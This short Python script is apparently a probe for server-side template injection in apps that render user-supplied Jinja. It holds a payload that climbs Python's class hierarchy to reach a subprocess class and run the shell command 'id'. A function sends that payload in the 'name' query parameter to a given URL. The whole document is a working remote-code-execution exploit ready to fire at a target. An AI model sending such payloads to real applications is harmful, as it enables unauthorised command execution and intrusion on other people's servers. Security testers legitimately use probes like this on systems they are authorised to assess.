#!/usr/bin/env python3
# Template-render probe for an app that renders user-supplied Jinja.
PROBES = [
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}",
]

def render(app_url: str) -> None:
    import urllib.request
    for probe in PROBES:
        urllib.request.urlopen(app_url + "?name=" + probe)
